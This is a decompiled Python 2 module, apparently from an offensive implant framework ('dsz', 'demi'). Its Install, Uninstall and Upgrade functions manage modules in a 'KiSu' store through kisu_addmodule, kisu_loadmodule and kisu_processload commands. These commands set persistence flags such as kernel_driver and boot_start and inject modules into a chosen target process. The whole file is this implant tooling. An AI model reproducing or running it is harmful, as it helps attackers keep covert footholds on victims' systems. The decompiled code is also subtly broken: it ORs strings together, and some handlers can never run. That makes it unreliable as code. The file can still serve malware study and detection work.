# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import dsz.file
import dsz.path
import dsz.process
import dsz.version
import demi

def Install(project, localFile, moduleName, moduleId, moduleOrder, flags, procName, ask=True, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(localFile) == 0:
        dsz.ui.Echo('* Invalid local name given', dsz.ERROR)
        return False
    else:
        if instance == None and not demi.EnsureConnected(ask):
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        try:
            dsz.ui.Echo('Attempting to install %s into KISU' % project)
            if not dsz.cmd.Run('kisu_addmodule %s-localfile "%s" -project %s -id %d -order %d -name "%s" -process "%s" -flags "%s"' % (instanceStr, localFile, project, moduleId, moduleOrder, moduleName, procName, flags)):
                dsz.ui.Echo('    FAILED', dsz.ERROR)
                return False
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            if dsz.ui.Prompt('Do you wish to attempt to load (for instant-grat)?'):
                desiredId = dsz.process.FindByName(procName)
                if len(desiredId) == 0:
                    dsz.ui.Echo('* Cannot attempt to load - target process not found', dsz.WARNING)
                    return False
                curId = int(dsz.env.Get('_PID'))
                if curId in desiredId:
                    dsz.ui.Echo('Loading module 0x%08x into the current process' % moduleId)
                    if dsz.cmd.Run('kisu_loadmodule %s-id 0x%08x' % (instanceStr, moduleId)):
                        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
                    else:
                        dsz.ui.Echo('    FAILED', dsz.ERROR)
                        return False
                else:
                    dsz.ui.Echo('Injecting AUTO_START modules into target process (%d: %s)' % (desiredId[0], procName))
                    if dsz.cmd.Run('kisu_processload %s-id 0x%08x' % (instanceStr, desiredId[0])):
                        dsz.ui.Echo('    SUCCESS', dsz.GOOD)
                    else:
                        dsz.ui.Echo('    FAILED', dsz.ERROR)
                        return False
        except:
            raise
            dsz.ui.Echo('* Exception thrown - unable to continue installation', dsz.ERROR)
            return False

        return True


def Uninstall(project, moduleName, moduleId, ask=True, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    rtn = True
    if instance == None and not demi.EnsureConnected(ask):
        return False
    else:
        if len(moduleName) == 0:
            dsz.ui.Echo('Invalid module name given', dsz.ERROR)
            return False
        if ask and not dsz.ui.Prompt('Do you want to uninstall the %s module (%s.sys)?' % (project, moduleName)):
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        dsz.ui.Echo('Removing module from KiSu store')
        if dsz.cmd.Run('kisu_deletemodule %s-id 0x%08x' % (instanceStr, moduleId)):
            dsz.ui.Echo('    SUCCESS', dsz.GOOD)
            return True
        dsz.ui.Echo('    FAILED', dsz.ERROR)
        return False
        return


def Upgrade(project, localFile, moduleName, moduleId, ask=True, instance=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if len(moduleName) == 0:
        dsz.ui.Echo('* Invalid module name given', dsz.ERROR)
        return False
    else:
        if len(project) == 0:
            dsz.ui.Echo('* Invalid project name given', dsz.ERROR)
            return False
        if moduleId == 0:
            dsz.ui.Echo('* Invalid module id given', dsz.ERROR)
            return False
        if instance == None and not demi.EnsureConnected(ask):
            return False
        if instance != None:
            instanceStr = '-instance 0x%08x ' % instance
        else:
            instanceStr = ''
        dsz.ui.Echo('Checking for presence of installed module')
        if not dsz.cmd.Run('kisu_config %s' % instanceStr, dsz.RUN_FLAG_RECORD):
            dsz.ui.Echo('    FAILED (Could not get KiSu configuration)', dsz.ERROR)
            return False
        try:
            modules = dsz.cmd.data.Get('configuration::module', dsz.TYPE_OBJECT)
            for module in modules:
                id = dsz.cmd.data.ObjectGet(module, 'id', dsz.TYPE_INT)[0]
                name = dsz.cmd.data.ObjectGet(module, 'moduleName', dsz.TYPE_STRING)[0]
                if moduleId != id or moduleName.lower() != name.lower():
                    continue
                dsz.ui.Echo('    FOUND', dsz.GOOD)
                dsz.ui.Echo('Copying configuration')
                order = dsz.cmd.data.ObjectGet(module, 'order', dsz.TYPE_INT)[0]
                flagsStr = ''
                if dsz.cmd.data.ObjectGet(module, 'flags::encrypted', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'encrypted'
                if dsz.cmd.data.ObjectGet(module, 'flags::compressed', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'compressed'
                if dsz.cmd.data.ObjectGet(module, 'flags::demand_load', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'demand_load'
                if dsz.cmd.data.ObjectGet(module, 'flags::service_key', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'service_key'
                if dsz.cmd.data.ObjectGet(module, 'flags::user_mode', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'user_mode'
                if dsz.cmd.data.ObjectGet(module, 'flags::kernel_driver', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'kernel_driver'
                if dsz.cmd.data.ObjectGet(module, 'flags::boot_start', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'boot_start'
                if dsz.cmd.data.ObjectGet(module, 'flags::auto_start_once', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'auto_start_once'
                if dsz.cmd.data.ObjectGet(module, 'flags::system_start', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'system_start'
                if dsz.cmd.data.ObjectGet(module, 'flags::auto_start', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'auto_start'
                if dsz.cmd.data.ObjectGet(module, 'flags::system_mode', dsz.TYPE_BOOL)[0]:
                    flagsStr = flagsStr | 'system_mode'
                procName = dsz.cmd.data.ObjectGet(module, 'processname', dsz.TYPE_STRING)[0]
                dsz.ui.Echo('    SUCCESS', dsz.GOOD)
                if not Uninstall(project, moduleName, moduleId, False, instance=instance):
                    dsz.ui.Echo('* Failed to remove previous installation', dsz.ERROR)
                    return False
                if not Install(project, localFile, moduleName, moduleId, order, flagsStr, procName, ask, instance=instance):
                    dsz.ui.Echo('* Upgrade failed, and previous module cannot be recovered', dsz.ERROR)
                    return False
                dsz.ui.Echo('Upgrade complete')
                return True

        except:
            raise
            dsz.ui.Echo('    FAILED (Exception thrown)', dsz.ERROR)
            return False

        return False